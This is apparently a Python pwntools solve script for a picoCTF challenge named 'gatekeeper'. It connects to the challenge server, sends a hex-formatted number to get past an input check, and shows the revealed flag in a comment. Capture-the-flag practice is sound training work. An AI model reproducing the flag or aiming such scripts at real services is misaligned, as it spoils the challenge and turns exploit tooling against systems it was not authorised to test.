#!/usr/bin/env python3

from pwn import *

exe = ELF('gatekeeper', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe
rop = ROP(exe)

context.terminal = ['/mnt/c/Windows/System32/cmd.exe', '/c', 'start', 'wt.exe', '-w', '0', 'split-pane', "--size", "0.6", '-d', '.', 'wsl.exe','-d', 'Ubuntu', 'bash', '-c' ]

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE and not args.DOCKER:
        gdb.attach(p, gdbscript='''
        set context-sections args regs disasm stack code expressions heap_tracker threads last_signal
        set follow-fork-mode parent



        
        c
        ''')
        input()

if args.REMOTE:
    p = remote('green-hill.picoctf.net', 49275)
elif args.DOCKER:
    p = remote('127.0.0.1')
else:
    p = process([exe.path])
GDB()

slna(b'>> ', hex(0x3e8))
'''
>>> s = "}e3dftc_oc_ip375cftc_oc_ip1_99ftc_oc_ip9_TGftc_oc_ip_xehftc_oc_ip_tigftc_oc_ipid_3ftc_oc_ip{FTCftc_oc_ipocipftc_oc_ip"
 s.replace("ftc_oc_ip","")
print(s[::-1])>>>
>>> s = s.replace("ftc_oc_ip","")
>>> print(s[::-1])
picoCTF{3_digit_hex_GT_999_1c573d3e}
>>>
'''
p.interactive()
